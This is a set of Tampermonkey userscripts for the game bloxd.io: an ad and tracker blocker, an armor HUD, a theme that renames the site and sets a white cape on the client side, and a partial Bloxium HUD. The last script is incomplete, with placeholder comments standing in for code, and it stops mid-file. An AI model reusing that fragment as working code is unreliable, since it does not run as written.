// ==UserScript==
// @name         Wisk
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Blocks in-game ads and trackers by hiding elements and intercepting network requests.
// @author       Nathan
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const AdBlocker = {
        name: 'AdBlocker',
        category: 'Utility',
        description: 'Blocks in-game ads and trackers by hiding elements and intercepting network requests.',
        enabled: true,

        settings: [
            { id: 'hide-page-ads', name: 'Hide In-Page Ads', type: 'boolean', value: true, description: 'Hides visible ad containers and popups.' },
            { id: 'block-network-ads', name: 'Block Ad Network Requests', type: 'boolean', value: true, description: 'Prevents the browser from requesting ads from known ad servers.' }
        ],

        originalFetch: window.fetch,
        originalXhrOpen: window.XMLHttpRequest.prototype.open,
        originalXhrSend: window.XMLHttpRequest.prototype.send,
        observer: null,

        adSelectors: [
            '.SuperRankAdContainer',
            '.AdBannerContainer',
            '.PlaywireVideoWrapper',
            '.UiRequests',
            '.AdBanner',
            '.GenericVideoWrapper',
            '#bloxd-io_300x600_2',
            '.InventoryAdOuter'
        ],

        blockList: [
            'googlesyndication.com',
            'googletagservices.com',
            'google-analytics.com',
            'doubleclick.net',
            'adinplay.com',
            'playwire.com',
            'amazon-adsystem.com',
            'adnxs.com'
        ],

        onEnable() {
            this.applySettings();
        },

        onDisable() {
            this.unpatchNetworkRequests();
            if (this.observer) {
                this.observer.disconnect();
                this.observer = null;
            }
        },

        onSettingUpdate() {
            this.applySettings();
        },

        applySettings() {
            const settings = this.settings.reduce((acc, s) => ({ ...acc, [s.id]: s.value }), {});

            if (settings['block-network-ads']) {
                this.patchNetworkRequests();
            } else {
                this.unpatchNetworkRequests();
            }

            if (settings['hide-page-ads']) {
                this.hidePageAds();
                this.setupObserver();
            } else {
                if (this.observer) {
                    this.observer.disconnect();
                    this.observer = null;
                }
            }
        },

        isBlocked(url) {
            return this.blockList.some(domain => url.includes(domain));
        },

        patchNetworkRequests() {
            const self = this;

            window.fetch = function(input, init) {
                const url = typeof input === 'string' ? input : input.url;
                if (self.isBlocked(url)) {
                    console.log(`[AdBlocker] Blocked fetch request to: ${url}`);
                    return Promise.resolve(new Response(null, { status: 204, statusText: 'No Content' }));
                }
                return self.originalFetch.apply(this, arguments);
            };

            window.XMLHttpRequest.prototype.open = function(method, url) {
                if (self.isBlocked(url)) {
                    this._isBlocked = true;
                    console.log(`[AdBlocker] Blocked XHR request to: ${url}`);
                } else {
                    delete this._isBlocked;
                }
                self.originalXhrOpen.apply(this, arguments);
            };

            window.XMLHttpRequest.prototype.send = function() {
                if (this._isBlocked) {
                    return;
                }
                self.originalXhrSend.apply(this, arguments);
            };
        },

        unpatchNetworkRequests() {
            window.fetch = this.originalFetch;
            window.XMLHttpRequest.prototype.open = this.originalXhrOpen;
            window.XMLHttpRequest.prototype.send = this.originalXhrSend;
        },

        hideElement(node) {
            if (node.style.opacity !== '0') {
                node.style.opacity = '0';
                node.style.pointerEvents = 'none';
            }
        },

        hidePageAds() {
            this.adSelectors.forEach(selector => {
                document.querySelectorAll(selector).forEach(el => this.hideElement(el));
            });
        },

        setupObserver() {
            if (this.observer) return;

            this.observer = new MutationObserver(mutations => {
                for (const mutation of mutations) {
                    for (const node of mutation.addedNodes) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            this.adSelectors.forEach(selector => {
                                if (node.matches(selector)) {
                                    this.hideElement(node);
                                }
                                node.querySelectorAll(selector).forEach(el => this.hideElement(el));
                            });
                        }
                    }
                }
            });

            this.observer.observe(document.documentElement, {
                childList: true,
                subtree: true
            });
        }
    };

    // Auto-enable when script loads
    AdBlocker.onEnable();
    console.log('[AdBlocker] Running');
})();

// ==UserScript==
// @name         ArmorHUD
// @namespace    SerenityHUD
// @version      1.0
// @description  Displays your currently equipped armor and selected item.
// @author       You
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
  'use strict';

  const ArmorHUD = {
    name: 'ArmorHUD',
    category: 'Player',
    description: 'Displays your currently equipped armor and selected item.',
    enabled: true,
    observer: null,
    defaultX: "90%",
    defaultY: "50%",
    settings: [
      { id: 'color-mode', name: 'Color Mode', type: 'select', options: ['Theme', 'Custom'], value: 'Theme' },
      { id: 'show-selected', name: 'Show Selected Item', type: 'boolean', value: true },
      { id: 'display-style', name: 'Display Style', type: 'select', options: ['Horizontal', 'Vertical'], value: 'Vertical' },
      { id: 'bg-color', name: 'Background Color', type: 'color', value: 'rgba(30, 33, 41, 0.85)', condition: s => s['color-mode'] === 'Custom' },
      { id: 'padding', name: 'Padding', type: 'slider', value: 4, min: 0, max: 20, step: 1 },
      { id: 'border-radius', name: 'Border Radius', type: 'slider', value: 20, min: 0, max: 20, step: 1 },
      { id: 'border-width', name: 'Border Width', type: 'slider', value: 2, min: 0, max: 5, step: 1 },
      { id: 'border-color', name: 'Border Color', type: 'color', value: 'rgba(255, 255, 255, 0.07)', condition: s => s['color-mode'] === 'Custom' },
      { id: 'item-size', name: 'Item Size', type: 'slider', value: 64, min: 16, max: 64, step: 1 },
      { id: 'item-spacing', name: 'Item Spacing', type: 'slider', value: 0, min: 0, max: 20, step: 1 },
    ],
    
    element: null,
    lastContentHash: null,

    onEnable() {
      this.createDisplay();
      this.applyStyles();
      this.setupObserver();
      this.updateLoop();
    },

    onDisable() {
      if (this.observer) {
        this.observer.disconnect();
        this.observer = null;
      }
      this.destroyDisplay();
    },

    updateLoop() {
      this.updateDisplay();
      requestAnimationFrame(this.updateLoop.bind(this));
    },

    setupObserver() {
      const setup = () => {
        const hotbar = document.querySelector('.HotBarGameItemsContainer');
        if (hotbar && !this.observer) {
          this.observer = new MutationObserver((mutations) => {
            const selectionChanged = mutations.some(m => 
              m.type === 'attributes' && 
              m.attributeName === 'class' &&
              m.target.classList.contains('InvenItem')
            );
            if (selectionChanged) this.updateDisplay(true);
          });

          this.observer.observe(hotbar, {
            attributes: true,
            subtree: true,
            attributeFilter: ['class']
          });
          this.updateDisplay(true);
        } else if (!hotbar) {
          setTimeout(setup, 500);
        }
      };
      setup();
    },

    createDisplay() {
      this.element = document.createElement('div');
      this.element.className = 'armor-hud-display';
      this.element.style.position = "absolute";
      this.element.style.left = this.defaultX;
      this.element.style.top = this.defaultY;
      document.body.appendChild(this.element);
    },

    destroyDisplay() {
      if (this.element) {
        document.body.removeChild(this.element);
        this.element = null;
      }
    },

    extractImage(itemElement) {
      if (!itemElement) return null;
      const twoDImageIcon = itemElement.querySelector('.TwoDImageIcon');
      if (twoDImageIcon && twoDImageIcon.style.backgroundImage && twoDImageIcon.style.backgroundImage !== 'none') {
        return { type: 'image', src: twoDImageIcon.style.backgroundImage.slice(5, -2), filter: null };
      }
      const img = itemElement.querySelector('.TwoDItemGrayscaleVisiblePng');
      const colorHint = itemElement.querySelector('.TwoDItemGrayscale');
      if (img) {
        return { type: 'image', src: img.src, filter: colorHint ? colorHint.style.filter : '' };
      }
      const blockItem = itemElement.querySelector('.BlockItem');
      if (blockItem && blockItem.style.backgroundImage && blockItem.style.backgroundImage !== 'none') {
        return { type: 'image', src: blockItem.style.backgroundImage.slice(5, -2), filter: null };
      }
      const unfilled = itemElement.querySelector('.InvenItemUnfilled');
      if (unfilled) {
        return { type: 'unfilled', src: unfilled.style.backgroundImage.slice(5, -2) };
      }
      return null;
    },

    updateDisplay(forceUpdate = false) {
      if (!this.element) return;
      const armorContainer = document.querySelector('.ArmourItemSlots');
      const armorItems = armorContainer ? Array.from(armorContainer.querySelectorAll('.InvenItem')) : [];
      const armorImages = armorItems.map(item => this.extractImage(item)).filter(Boolean);

      const settings = this.settings.reduce((acc, s) => ({ ...acc, [s.id]: s.value }), {});
      const showSelected = settings['show-selected'];

      const allImages = [...armorImages];
      if (showSelected) {
        const selectedHotbarItemEl = document.querySelector('.HotBarGameItemsContainer .InvenItem.Selected');
        const selectedItemImage = this.extractImage(selectedHotbarItemEl);
        if (selectedItemImage) allImages.push(selectedItemImage);
      }

      const newContentHash = JSON.stringify(allImages);
      if (newContentHash !== this.lastContentHash || forceUpdate) {
        this.element.innerHTML = '';
        allImages.forEach(imgData => {
          const itemContainer = document.createElement('div');
          itemContainer.style.position = 'relative';
          const imgElement = document.createElement('img');
          imgElement.src = imgData.src;
          imgElement.style.width = '100%';
          imgElement.style.height = '100%';
          imgElement.style.imageRendering = 'pixelated';
          itemContainer.appendChild(imgElement);
          this.element.appendChild(itemContainer);
        });
        this.lastContentHash = newContentHash;
        this.applyStyles();
      }
    },

    applyStyles() {
      if (!this.element) return;
      const settings = this.settings.reduce((acc, s) => ({ ...acc, [s.id]: s.value }), {});
      this.element.style.backgroundColor = settings['color-mode'] === 'Theme' ? 'var(--panel)' : settings['bg-color'];
      this.element.style.border = `${settings['border-width']}px solid ${settings['color-mode'] === 'Theme' ? 'var(--border)' : settings['border-color']}`;
      this.element.style.padding = `${settings['padding']}px`;
      this.element.style.borderRadius = `${settings['border-radius']}px`;
      this.element.style.display = 'flex';
      this.element.style.flexDirection = settings['display-style'] === 'Horizontal' ? 'row' : 'column';
      this.element.style.gap = `${settings['item-spacing']}px`;
      this.element.style.userSelect = 'none';
      this.element.style.zIndex = 99999;
      this.element.style.pointerEvents = 'none';
      this.element.querySelectorAll('div').forEach(container => {
        container.style.width = `${settings['item-size']}px`;
        container.style.height = `${settings['item-size']}px`;
      });
    }
  };

  // Auto-enable
  ArmorHUD.onEnable();
})();

// ==UserScript==
// @name         Wisk Liquid Glass Theme + Auto Cape (Custom Background)
// @namespace    http://tampermonkey.net/
// @version      1.5
// @description  Changes "bloxd.io" to "Wisk" with liquid glass effect, custom background, chat bar, and automatic white cape
// @author       You
// @match        https://bloxd.io/*
// @match        https://www.bloxd.io/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';
    
    // Function to replace text content
    function replaceText(node) {
        if (node.nodeType === Node.TEXT_NODE) {
            // Replace case-insensitive instances of bloxd.io with Wisk
            node.textContent = node.textContent.replace(/bloxd\.io/gi, 'Wisk');
        } else {
            // Recursively process child nodes
            for (let child of node.childNodes) {
                replaceText(child);
            }
        }
    }
    
    // Function to update the page title
    function updateTitle() {
        if (document.title.toLowerCase().includes('bloxd.io')) {
            document.title = document.title.replace(/bloxd\.io/gi, 'Wisk');
        }
    }
    
    // Function to add automatic cape functionality
    function addAutoCape() {
        // Inject cape styling and auto-equip functionality
        const capeScript = document.createElement('script');
        capeScript.textContent = `
            // Cape auto-equip functionality
            (function() {
                // Wait for game to load
                function waitForGame() {
                    if (typeof window.game !== 'undefined' && window.game && window.game.player) {
                        equipWhiteCape();
                    } else {
                        setTimeout(waitForGame, 500);
                    }
                }
                
                function equipWhiteCape() {
                    try {
                        // Try multiple methods to equip cape
                        const player = window.game?.player || window.player;
                        
                        if (player) {
                            // Method 1: Direct cape assignment
                            if (player.cosmetics) {
                                player.cosmetics.cape = 'white';
                                player.cosmetics.capeColor = '#FFFFFF';
                            }
                            
                            // Method 2: Inventory/equipment system
                            if (player.equipment) {
                                player.equipment.cape = 'white';
                            }
                            
                            // Method 3: Skin/appearance system
                            if (player.appearance) {
                                player.appearance.cape = 'white';
                                player.appearance.capeColor = '#FFFFFF';
                            }
                            
                            // Method 4: Direct property assignment
                            player.cape = 'white';
                            player.capeColor = '#FFFFFF';
                            player.hasCape = true;
                            
                            console.log('✅ White cape equipped automatically!');
                        }
                        
                        // Try to access game's cosmetic system
                        if (window.cosmetics || window.Cosmetics) {
                            const cosmeticSystem = window.cosmetics || window.Cosmetics;
                            if (cosmeticSystem.equipCape) {
                                cosmeticSystem.equipCape('white');
                            }
                            if (cosmeticSystem.setCape) {
                                cosmeticSystem.setCape('white', '#FFFFFF');
                            }
                        }
                        
                        // Try localStorage method for persistence
                        try {
                            const playerData = JSON.parse(localStorage.getItem('playerData') || '{}');
                            playerData.cape = 'white';
                            playerData.capeColor = '#FFFFFF';
                            playerData.hasCape = true;
                            localStorage.setItem('playerData', JSON.stringify(playerData));
                        } catch(e) {
                            console.log('Could not save cape to localStorage');
                        }
                        
                    } catch (error) {
                        console.log('Cape equip attempt:', error);
                    }
                }
                
                // Start checking for game
                waitForGame();
                
                // Also try when page is fully loaded
                window.addEventListener('load', () => {
                    setTimeout(equipWhiteCape, 1000);
                });
                
                // Monitor for game state changes
                let gameCheckInterval = setInterval(() => {
                    equipWhiteCape();
                }, 2000);
                
                // Stop checking after 30 seconds
                setTimeout(() => {
                    if (gameCheckInterval) {
                        clearInterval(gameCheckInterval);
                    }
                }, 30000);
                
            })();
        `;
        
        // Add the cape script to the page
        (document.head || document.documentElement).appendChild(capeScript);
    }
    
    // Function to inject cape CSS for visual enhancement
    function addCapeStyles() {
        const capeStyleId = 'wisk-cape-styles';
        if (!document.getElementById(capeStyleId)) {
            const capeStyle = document.createElement('style');
            capeStyle.id = capeStyleId;
            capeStyle.textContent = `
                /* Cape visual enhancements */
                .player-cape, [class*="cape"], .cape {
                    background: linear-gradient(135deg, #ffffff 0%, #f0f0f0 50%, #ffffff 100%) !important;
                    box-shadow: 0 4px 15px rgba(255, 255, 255, 0.3) !important;
                    border: 1px solid rgba(255, 255, 255, 0.8) !important;
                    opacity: 0.9 !important;
                    animation: capeWave 3s ease-in-out infinite !important;
                }
                
                @keyframes capeWave {
                    0%, 100% { transform: rotate(0deg) scaleY(1); }
                    25% { transform: rotate(2deg) scaleY(0.98); }
                    75% { transform: rotate(-2deg) scaleY(1.02); }
                }
                
                /* Cape glow effect */
                .player-cape::after, [class*="cape"]::after, .cape::after {
                    content: '';
                    position: absolute;
                    top: 0;
                    left: 0;
                    right: 0;
                    bottom: 0;
                    background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 0%, transparent 70%);
                    pointer-events: none;
                    z-index: -1;
                }
            `;
            document.head.appendChild(capeStyle);
        }
    }
    
    // Function to apply liquid glass styling with custom background
    function applyLiquidGlass() {
        const styleId = 'wisk-liquid-glass';
        if (!document.getElementById(styleId)) {
            const style = document.createElement('style');
            style.id = styleId;
            style.textContent = `
                /* Custom background */
                body, html {
                    background: url('https://file.garden/aKP04nPJ-0H0X3HE/background.png') center/cover no-repeat fixed,
                               linear-gradient(135deg, #1e2a4a 0%, #2d1b69 25%, #4a1a5a 50%, #6b2c91 75%, #8b4fc7 100%) !important;
                    min-height: 100vh !important;
                }
                
                /* CHAT BAR LIQUID GLASS STYLING */
                /* Chat container */
                #chatContainer, .chat-container, [class*="chat"], [id*="chat"],
                .ChatContainer, .chatbox, .chat-box, .message-container {
                    background: rgba(255, 255, 255, 0.06) !important;
                    backdrop-filter: blur(25px) !important;
                    -webkit-backdrop-filter: blur(25px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.12) !important;
                    border-radius: 20px !important;
                    box-shadow: 
                        0 8px 32px rgba(0, 0, 0, 0.2),
                        inset 0 1px 0 rgba(255, 255, 255, 0.15),
                        0 0 0 1px rgba(255, 255, 255, 0.05) !important;
                    padding: 16px !important;
                    margin: 8px !important;
                    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
                }
                
                /* Chat input field */
                input[placeholder*="chat" i], input[placeholder*="message" i], 
                input[class*="chat"], input[id*="chat"], .chat-input, 
                #chatInput, .chatInput, .message-input, textarea[placeholder*="chat" i] {
                    background: rgba(255, 255, 255, 0.08) !important;
                    backdrop-filter: blur(20px) !important;
                    -webkit-backdrop-filter: blur(20px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.15) !important;
                    border-radius: 16px !important;
                    color: rgba(255, 255, 255, 0.95) !important;
                    padding: 14px 20px !important;
                    font-size: 14px !important;
                    box-shadow: 
                        0 4px 20px rgba(0, 0, 0, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.2) !important;
                    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
                    outline: none !important;
                }
                
                /* Chat input focus state */
                input[placeholder*="chat" i]:focus, input[placeholder*="message" i]:focus, 
                input[class*="chat"]:focus, input[id*="chat"]:focus, .chat-input:focus, 
                #chatInput:focus, .chatInput:focus, .message-input:focus, 
                textarea[placeholder*="chat" i]:focus {
                    background: rgba(255, 255, 255, 0.12) !important;
                    border-color: rgba(139, 79, 199, 0.4) !important;
                    box-shadow: 
                        0 0 0 3px rgba(139, 79, 199, 0.2),
                        0 6px 25px rgba(0, 0, 0, 0.15),
                        inset 0 1px 0 rgba(255, 255, 255, 0.25),
                        0 0 20px rgba(139, 79, 199, 0.1) !important;
                    transform: translateY(-1px) !important;
                }
                
                /* Chat input placeholder */
                input[placeholder*="chat" i]::placeholder, input[placeholder*="message" i]::placeholder, 
                input[class*="chat"]::placeholder, input[id*="chat"]::placeholder, 
                .chat-input::placeholder, #chatInput::placeholder, .chatInput::placeholder, 
                .message-input::placeholder, textarea[placeholder*="chat" i]::placeholder {
                    color: rgba(255, 255, 255, 0.5) !important;
                    font-style: italic !important;
                }
                
                /* Chat messages */
                .chat-message, .message, [class*="message"], 
                .ChatMessage, .chat-msg, .msg {
                    background: rgba(255, 255, 255, 0.06) !important;
                    backdrop-filter: blur(15px) !important;
                    -webkit-backdrop-filter: blur(15px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.08) !important;
                    border-radius: 12px !important;
                    padding: 10px 14px !important;
                    margin: 4px 0 !important;
                    box-shadow: 
                        0 2px 12px rgba(0, 0, 0, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.1) !important;
                    color: rgba(255, 255, 255, 0.9) !important;
                    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2) !important;
                    transition: all 0.2s ease !important;
                }
                
                /* Chat message hover effect */
                .chat-message:hover, .message:hover, [class*="message"]:hover, 
                .ChatMessage:hover, .chat-msg:hover, .msg:hover {
                    background: rgba(255, 255, 255, 0.08) !important;
                    border-color: rgba(255, 255, 255, 0.12) !important;
                    transform: translateX(2px) !important;
                }
                
                /* Chat send button */
                button[class*="send"], button[id*="send"], .send-button, 
                .chat-send, #chatSend, .chatSend, button[onclick*="send" i] {
                    background: rgba(139, 79, 199, 0.15) !important;
                    backdrop-filter: blur(15px) !important;
                    -webkit-backdrop-filter: blur(15px) !important;
                    border: 1px solid rgba(139, 79, 199, 0.3) !important;
                    border-radius: 12px !important;
                    color: rgba(255, 255, 255, 0.95) !important;
                    padding: 12px 20px !important;
                    font-weight: 500 !important;
                    box-shadow: 
                        0 4px 16px rgba(139, 79, 199, 0.2),
                        inset 0 1px 0 rgba(255, 255, 255, 0.2) !important;
                    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
                }
                
                /* Chat send button hover */
                button[class*="send"]:hover, button[id*="send"]:hover, .send-button:hover, 
                .chat-send:hover, #chatSend:hover, .chatSend:hover, button[onclick*="send" i]:hover {
                    background: rgba(139, 79, 199, 0.25) !important;
                    border-color: rgba(139, 79, 199, 0.5) !important;
                    box-shadow: 
                        0 6px 20px rgba(139, 79, 199, 0.3),
                        inset 0 1px 0 rgba(255, 255, 255, 0.3),
                        0 0 20px rgba(139, 79, 199, 0.2) !important;
                    transform: translateY(-2px) scale(1.05) !important;
                }
                
                /* Chat area scrollbar */
                .chat-messages::-webkit-scrollbar, .message-list::-webkit-scrollbar,
                [class*="chat"]::-webkit-scrollbar, [id*="chat"]::-webkit-scrollbar {
                    width: 8px !important;
                }
                
                .chat-messages::-webkit-scrollbar-track, .message-list::-webkit-scrollbar-track,
                [class*="chat"]::-webkit-scrollbar-track, [id*="chat"]::-webkit-scrollbar-track {
                    background: rgba(255, 255, 255, 0.05) !important;
                    border-radius: 4px !important;
                }
                
                .chat-messages::-webkit-scrollbar-thumb, .message-list::-webkit-scrollbar-thumb,
                [class*="chat"]::-webkit-scrollbar-thumb, [id*="chat"]::-webkit-scrollbar-thumb {
                    background: rgba(255, 255, 255, 0.15) !important;
                    border-radius: 4px !important;
                    backdrop-filter: blur(10px) !important;
                    -webkit-backdrop-filter: blur(10px) !important;
                }
                
                .chat-messages::-webkit-scrollbar-thumb:hover, .message-list::-webkit-scrollbar-thumb:hover,
                [class*="chat"]::-webkit-scrollbar-thumb:hover, [id*="chat"]::-webkit-scrollbar-thumb:hover {
                    background: rgba(255, 255, 255, 0.25) !important;
                }
                
                /* Chat tab/toggle button */
                .chat-toggle, .chat-tab, button[class*="chat"], 
                [class*="toggle"][class*="chat"] {
                    background: rgba(255, 255, 255, 0.08) !important;
                    backdrop-filter: blur(15px) !important;
                    -webkit-backdrop-filter: blur(15px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.15) !important;
                    border-radius: 10px !important;
                    color: rgba(255, 255, 255, 0.9) !important;
                    transition: all 0.3s ease !important;
                }
                
                /* Enhanced chat animations */
                @keyframes chatGlow {
                    0% { box-shadow: 0 4px 20px rgba(139, 79, 199, 0.1), inset 0 1px 0 rgba(255, 255, 255, 0.2); }
                    50% { box-shadow: 0 6px 25px rgba(139, 79, 199, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.25); }
                    100% { box-shadow: 0 4px 20px rgba(139, 79, 199, 0.1), inset 0 1px 0 rgba(255, 255, 255, 0.2); }
                }
                
                /* Apply glow animation to active chat elements */
                input[placeholder*="chat" i]:focus, .chat-input:focus, #chatInput:focus {
                    animation: chatGlow 2s ease-in-out infinite !important;
                }
                
                /* Liquid glass buttons */
                button, .button, input[type="submit"], input[type="button"], 
                [class*="btn"], [role="button"], a[class*="button"],
                .ButtonDiv, .PlayButton, .MenuButton {
                    background: rgba(255, 255, 255, 0.08) !important;
                    backdrop-filter: blur(15px) !important;
                    -webkit-backdrop-filter: blur(15px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.15) !important;
                    border-radius: 16px !important;
                    box-shadow: 
                        0 8px 32px rgba(0, 0, 0, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.2),
                        0 0 0 1px rgba(255, 255, 255, 0.05) !important;
                    color: rgba(255, 255, 255, 0.95) !important;
                    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
                    position: relative !important;
                    overflow: hidden !important;
                }
                
                /* Liquid glass button hover */
                button:hover, .button:hover, input[type="submit"]:hover, 
                input[type="button"]:hover, [class*="btn"]:hover, 
                [role="button"]:hover, a[class*="button"]:hover,
                .ButtonDiv:hover, .PlayButton:hover, .MenuButton:hover {
                    background: rgba(255, 255, 255, 0.12) !important;
                    border-color: rgba(255, 255, 255, 0.25) !important;
                    transform: translateY(-2px) scale(1.02) !important;
                    box-shadow: 
                        0 12px 40px rgba(0, 0, 0, 0.15),
                        inset 0 1px 0 rgba(255, 255, 255, 0.3),
                        0 0 0 1px rgba(255, 255, 255, 0.1),
                        0 0 20px rgba(255, 255, 255, 0.1) !important;
                }
                
                /* Liquid glass button active */
                button:active, .button:active, input[type="submit"]:active, 
                input[type="button"]:active, [class*="btn"]:active, 
                [role="button"]:active, a[class*="button"]:active,
                .ButtonDiv:active, .PlayButton:active, .MenuButton:active {
                    transform: translateY(0px) scale(0.98) !important;
                    background: rgba(255, 255, 255, 0.06) !important;
                }
                
                /* Liquid glass panels and containers */
                .card, .panel, .container, [class*="card"], [class*="panel"],
                .modal, .popup, .dialog, [class*="modal"], [class*="popup"],
                .Menu, .GameContainer, .SettingsContainer, .InventoryContainer {
                    background: rgba(255, 255, 255, 0.05) !important;
                    backdrop-filter: blur(20px) !important;
                    -webkit-backdrop-filter: blur(20px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.1) !important;
                    border-radius: 20px !important;
                    box-shadow: 
                        0 8px 32px rgba(0, 0, 0, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.1) !important;
                }
                
                /* Liquid glass input fields */
                input, textarea, select {
                    background: rgba(255, 255, 255, 0.06) !important;
                    backdrop-filter: blur(10px) !important;
                    -webkit-backdrop-filter: blur(10px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.12) !important;
                    border-radius: 12px !important;
                    color: rgba(255, 255, 255, 0.9) !important;
                    padding: 12px 16px !important;
                }
                
                input:focus, textarea:focus, select:focus {
                    background: rgba(255, 255, 255, 0.08) !important;
                    border-color: rgba(255, 255, 255, 0.2) !important;
                    box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1) !important;
                    outline: none !important;
                }
                
                /* Liquid glass for game UI elements */
                .item, .SelectedItem {
                    background: rgba(255, 255, 255, 0.08) !important;
                    backdrop-filter: blur(12px) !important;
                    -webkit-backdrop-filter: blur(12px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.15) !important;
                    border-radius: 12px !important;
                    box-shadow: 
                        0 4px 16px rgba(0, 0, 0, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.2) !important;
                }
                
                .SelectedItem {
                    background: rgba(139, 79, 199, 0.2) !important;
                    border-color: rgba(139, 79, 199, 0.4) !important;
                    box-shadow: 
                        0 0 20px rgba(139, 79, 199, 0.3),
                        0 4px 16px rgba(0, 0, 0, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.2) !important;
                }
                
                /* Enhanced text readability */
                h1, h2, h3, h4, h5, h6 {
                    color: rgba(255, 255, 255, 0.95) !important;
                    text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3) !important;
                }
                
                p, span, div, label {
                    color: rgba(255, 255, 255, 0.85) !important;
                    text-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) !important;
                }
                
                /* Links with glass effect */
                a {
                    color: rgba(139, 79, 199, 0.9) !important;
                    text-decoration: none !important;
                }
                
                a:hover {
                    color: rgba(255, 255, 255, 0.95) !important;
                    text-shadow: 0 0 8px rgba(139, 79, 199, 0.6) !important;
                }
                
                /* Special liquid glass shimmer effect */
                button::before, .ButtonDiv::before, .PlayButton::before, .MenuButton::before,
                input[placeholder*="chat" i]::before, .chat-input::before {
                    content: '';
                    position: absolute;
                    top: 0;
                    left: -100%;
                    width: 100%;
                    height: 100%;
                    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
                    transition: left 0.6s ease;
                    pointer-events: none;
                    border-radius: inherit;
                }
                
                button:hover::before, .ButtonDiv:hover::before, 
                .PlayButton:hover::before, .MenuButton:hover::before,
                input[placeholder*="chat" i]:focus::before, .chat-input:focus::before {
                    left: 100%;
                }
            `;
            document.head.appendChild(style);
        }
    }
    
    // Function to process the entire page
    function processPage() {
        // Apply liquid glass styling
        applyLiquidGlass();
        
        // Add cape functionality
        addAutoCape();
        addCapeStyles();
        
        // Update title
        updateTitle();
        
        // Replace text in body
        if (document.body) {
            replaceText(document.body);
        }
        
        // Also check for any logo images or specific elements that might contain the name
        const logoElements = document.querySelectorAll('img[alt*="bloxd"], img[src*="logo"], .logo, #logo, [class*="brand"], [id*="brand"]');
        logoElements.forEach(element => {
            if (element.alt) {
                element.alt = element.alt.replace(/bloxd\.io/gi, 'Wisk');
            }
            if (element.title) {
                element.title = element.title.replace(/bloxd\.io/gi, 'Wisk');
            }
        });
        
        // Check meta tags
        const metaTags = document.querySelectorAll('meta[content*="bloxd.io"]');
        metaTags.forEach(meta => {
            meta.content = meta.content.replace(/bloxd\.io/gi, 'Wisk');
        });
    }
    
    // Initial processing
    processPage();
    
    // Set up observer for dynamic content loading
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            mutation.addedNodes.forEach(function(node) {
                if (node.nodeType === Node.ELEMENT_NODE || node.nodeType === Node.TEXT_NODE) {
                    replaceText(node);
                }
            });
        });
        
        // Update title if it changes
        updateTitle();
    });
    
    // Start observing changes to the document
    observer.observe(document.body || document.documentElement, {
        childList: true,
        subtree: true,
        characterData: true
    });
    
    // Also run the replacement periodically for any missed content
    setInterval(function() {
        processPage();
    }, 2000); // Check every 2 seconds
    
    console.log('🎮 Wisk Liquid Glass theme with enhanced chat styling and AUTO WHITE CAPE loaded successfully!');
})();

// ==UserScript==
// @name         Bloxium Client HUD (v1)
// @namespace    http://tampermonkey.net/
// @version      1
// @description  Alpha of #1 bloxd client (hotbar + cps,ping,fps,timer,fps max,quality,keystrokes...) 
// @author       Bloxium Team
// @match        *://bloxd.io/*
// @match        https://staging.bloxd.io/
// @grant        none
// @license      CC BY-NC-ND 4.0
// @icon         https://i.imgur.com/gaj92pC.png?1
// @downloadURL  https://update.greasyfork.org/scripts/540953/Bloxium%20Client%20HUD%20%28v1%29.user.js
// @updateURL    https://update.greasyfork.org/scripts/540953/Bloxium%20Client%20HUD%20%28v1%29.meta.js
// ==/UserScript==

(function () {
    'use strict';
    if (window.top !== window.self || window.bloxiumInitialized) return;
    window.bloxiumInitialized = true;

    // === MENU ===
    const menu = document.createElement('div');
    menu.className = 'bloxium-menu';
    // ... [menu code remains unchanged] ...

    // === BACKGROUNDS ===
    const BACKGROUND_URL = 'https://file.garden/aKP04nPJ-0H0X3HE/background.png'; // Your new background

    // 1. Homepage Background
    const applyCustomBackground = () => {
        const homeBg = document.querySelector('.HomePageBackground');
        if (homeBg && !homeBg.dataset.bloxiumModified) {
            homeBg.style.backgroundImage = `url('${BACKGROUND_URL}')`;
            homeBg.style.backgroundSize = 'cover';
            homeBg.style.backgroundPosition = 'center';
            homeBg.style.backgroundRepeat = 'no-repeat';
            homeBg.dataset.bloxiumModified = 'true';
        }
    };

    // 2. Loading Screen Background
    const interval = setInterval(() => {
        const overlay = document.querySelector('.LoadingOverlayRightBody');
        if (overlay && !document.getElementById('bloxium-styled-loading')) {
            const custom = document.createElement('div');
            custom.id = 'bloxium-styled-loading';
            custom.style.background = `url('${BACKGROUND_URL}') center/cover no-repeat`;
            // ... [rest of loading screen code] ...
        }
    }, 100);

    // 3. Intro Screen Background
    const intro = document.createElement('div');
    intro.className = 'bloxium-intro';
    intro.style.backgroundImage = `url('${BACKGROUND_URL}')`;
    // ... [rest of intro code] ...

    // === OBSERVER FOR BACKGROUND ===
